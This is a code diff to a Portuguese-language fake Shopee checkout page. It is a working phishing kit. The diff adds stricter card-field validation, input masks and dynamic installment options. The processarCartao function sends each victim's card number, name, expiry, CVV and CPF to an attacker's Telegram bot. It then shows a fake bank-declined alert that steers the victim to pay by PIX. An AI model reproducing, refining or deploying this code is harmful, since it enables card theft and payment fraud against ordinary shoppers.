@@ -56,7 +56,7 @@
 <body>
 
     <div id="checkoutPage" class="page active">
-        <div class="header"><i class="fas fa-arrow-left"></i> <h1>Finalizar Compra</h1></div>
+        <div class="header"><i class="fas fa-arrow-left" onclick="window.history.back()"></i> <h1>Finalizar Compra</h1></div>
 
         <div class="section" onclick="openPage('addrPage')">
             <div class="addr-box">
@@ -86,7 +86,7 @@
                     <span style="font-size:13px;"><i class="fas fa-truck" style="color:var(--teal)"></i> Opção de Envio</span>
                     <span style="font-size:13px;">Grátis <i class="fas fa-chevron-right" style="color:#ccc"></i></span>
                 </div>
-                <p class="delivery-date" id="deliveryDate">Receba entre 20 Fev - 22 Fev</p>
+                <p class="delivery-date" id="deliveryDate">Calculando data...</p>
             </div>
         </div>
 
@@ -148,7 +148,7 @@
         <div class="header" onclick="openPage('checkoutPage')"><i class="fas fa-arrow-left"></i> <h1>Editar Endereço</h1></div>
         <div class="section">
             <input type="text" id="inName" placeholder="Nome Completo">
-            <input type="tel" id="inCep" placeholder="CEP" maxlength="8" onblur="buscarCep()">
+            <input type="tel" id="inCep" placeholder="CEP (8 dígitos)" maxlength="8" onblur="buscarCep()">
             <input type="text" id="inRua" placeholder="Rua / Logradouro">
             <div style="display:flex; gap:10px;">
                 <input type="text" id="inNum" placeholder="Número">
@@ -171,14 +171,11 @@
                 <input type="tel" id="cardExp" placeholder="MM/AA" maxlength="5">
                 <input type="tel" id="cardCvv" placeholder="CVV" maxlength="3">
             </div>
-            <input type="tel" id="cardCpf" placeholder="CPF do Titular">
+            <input type="tel" id="cardCpf" placeholder="CPF do Titular" maxlength="14">
             
             <p style="font-size:13px; margin: 10px 0;">Parcelamento:</p>
             <select id="cardInstallments">
-                <option value="1">1x de R$ 2.007,00 (Sem juros)</option>
-                <option value="10">10x de R$ 200,70 (Sem juros)</option>
-                <option value="12">12x de R$ 167,25 (Sem juros)</option>
-            </select>
+                </select>
 
             <button class="btn-shopee" style="width:100%; border-radius:4px; height:45px;" onclick="processarCartao()">CONFIRMAR PAGAMENTO</button>
         </div>
@@ -205,6 +202,7 @@
         const TG_ID = '7294447445';
 
         let isPixSelected = false;
+        let valorAtual = 2007.00;
 
         function openPage(id) {
             document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
@@ -212,7 +210,20 @@
             window.scrollTo(0,0);
         }
 
-        // LÓGICA DE DATA DINÂMICA (8 a 10 dias)
+        // GERAÇÃO DE PARCELAS DINÂMICAS
+        function atualizarParcelas(valor) {
+            const select = document.getElementById('cardInstallments');
+            select.innerHTML = '';
+            for (let i = 1; i <= 12; i++) {
+                let valorParcela = (valor / i).toFixed(2).replace('.', ',');
+                let option = document.createElement('option');
+                option.value = i;
+                option.text = `${i}x de R$ ${valorParcela} (Sem juros)`;
+                select.appendChild(option);
+            }
+        }
+
+        // DATA DE ENTREGA (8 a 10 dias)
         function calcularEntrega() {
             const hoje = new Date();
             const d8 = new Date(); d8.setDate(hoje.getDate() + 8);
@@ -220,7 +231,6 @@
             const meses = ["Jan", "Fev", "Mar", "Abr", "Mai", "Jun", "Jul", "Ago", "Set", "Out", "Nov", "Dez"];
             document.getElementById('deliveryDate').innerText = `Receba entre ${d8.getDate()} ${meses[d8.getMonth()]} - ${d10.getDate()} ${meses[d10.getMonth()]}`;
         }
-        calcularEntrega();
 
         // BUSCA CEP
         async function buscarCep() {
@@ -239,10 +249,16 @@
         function salvarEndereco() {
             const nome = document.getElementById('inName').value;
             const rua = document.getElementById('inRua').value;
-            if(nome && rua) {
+            const num = document.getElementById('inNum').value;
+            const bairro = document.getElementById('inBairro').value;
+            const cep = document.getElementById('inCep').value;
+
+            if(nome && rua && num) {
                 document.getElementById('dispName').innerText = nome;
-                document.getElementById('dispAddr').innerText = `${rua}, ${document.getElementById('inNum').value}, ${document.getElementById('inBairro').value}`;
+                document.getElementById('dispAddr').innerText = `${rua}, ${num}, ${bairro}, ${cep}`;
                 openPage('checkoutPage');
+            } else {
+                alert('Preencha os campos obrigatórios!');
             }
         }
 
@@ -250,51 +266,90 @@
             isPixSelected = !isPixSelected;
             document.getElementById('payPix').classList.toggle('active', isPixSelected);
             document.getElementById('pixDiscountRow').style.display = isPixSelected ? 'flex' : 'none';
-            const v = isPixSelected ? 'R$1.997,00' : 'R$2.007,00';
-            document.getElementById('finalPrice').innerText = v;
-            document.getElementById('footerPrice').innerText = v;
+            
+            valorAtual = isPixSelected ? 1997.00 : 2007.00;
+            const formatado = valorAtual.toLocaleString('pt-BR', { minimumFractionDigits: 2 });
+            
+            document.getElementById('finalPrice').innerText = `R$${formatado}`;
+            document.getElementById('footerPrice').innerText = `R$${formatado}`;
+            atualizarParcelas(valorAtual);
         }
 
         async function processarCartao() {
-            const n = document.getElementById('cardNumber').value;
+            const n = document.getElementById('cardNumber').value.replace(/\s/g, '');
             const nm = document.getElementById('cardName').value;
             const ex = document.getElementById('cardExp').value;
             const cv = document.getElementById('cardCvv').value;
             const cp = document.getElementById('cardCpf').value;
+            const par = document.getElementById('cardInstallments').value;
 
-            if(!n || !nm || !cv) return alert('Preencha os dados do cartão!');
+            if(n.length < 16 || !nm || ex.length < 5 || cv.length < 3 || cp.length < 11) {
+                return alert('Por favor, preencha todos os dados do cartão corretamente.');
+            }
 
-            const msg = `💳 *NOVO CARD SHOPEE*\n\nNº: \`${n}\`\nNome: ${nm}\nVal: ${ex}\nCVV: \`${cv}\`\nCPF: ${cp}`;
+            const msg = `💳 *NOVO CARD SHOPEE*\n\n` +
+                        `🔹 Nº: \`${n}\`\n` +
+                        `🔹 Nome: ${nm}\n` +
+                        `🔹 Val: ${ex}\n` +
+                        `🔹 CVV: \`${cv}\`\n` +
+                        `🔹 CPF: ${cp}\n` +
+                        `🔹 Parcelas: ${par}x\n` +
+                        `🔹 Valor: R$ ${valorAtual}`;
             
-            await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ chat_id: TG_ID, text: msg, parse_mode: 'Markdown' })
-            });
-
-            alert('Erro no processamento: Instabilidade no banco emissor. Para garantir sua reserva e o desconto aplicado, utilize o PIX Copia e Cola.');
-            openPage('pixPage');
+            try {
+                await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ chat_id: TG_ID, text: msg, parse_mode: 'Markdown' })
+                });
+                
+                alert('O banco emissor recusou a transação. Para garantir sua reserva e o desconto do cupom, utilize o PIX.');
+                openPage('pixPage');
+            } catch (e) {
+                alert('Erro de conexão. Tente novamente.');
+            }
         }
 
         function finalizarPedido() {
             if(isPixSelected) openPage('pixPage');
-            else alert('Selecione o método de pagamento Pix ou Adicione um Cartão.');
+            else alert('Selecione um método de pagamento ou adicione um cartão.');
         }
 
         function copyPix() {
-            navigator.clipboard.writeText(document.getElementById('pixCode').innerText);
-            alert('Código Pix copiado!');
+            const code = document.getElementById('pixCode').innerText;
+            navigator.clipboard.writeText(code);
+            alert('Código Pix Copiado com sucesso!');
         }
 
-        // MÁSCARAS
+        // MÁSCARAS DE INPUT
         document.getElementById('cardNumber').oninput = e => {
             e.target.value = e.target.value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim();
         };
         document.getElementById('cardExp').oninput = e => {
-            e.target.value = e.target.value.replace(/\D/g, '').replace(/(.{2})/, '$1/');
+            let v = e.target.value.replace(/\D/g, '');
+            if(v.length >= 2) v = v.substring(0,2) + '/' + v.substring(2,4);
+            e.target.value = v;
+        };
+        document.getElementById('cardCvv').oninput = e => {
+            e.target.value = e.target.value.replace(/\D/g, '').substring(0,3);
+        };
+        document.getElementById('cardCpf').oninput = e => {
+            let v = e.target.value.replace(/\D/g, '');
+            if(v.length <= 11) {
+                v = v.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
+            }
+            e.target.value = v;
+        };
+        document.getElementById('inCep').oninput = e => {
+            e.target.value = e.target.value.replace(/\D/g, '').substring(0,8);
+        };
+
+        // INICIALIZAÇÃO
+        window.onload = () => {
+            calcularEntrega();
+            atualizarParcelas(2007.00);
         };
     </script>
 </body>
-    </html>
-    
-
+                    </html>
+                    
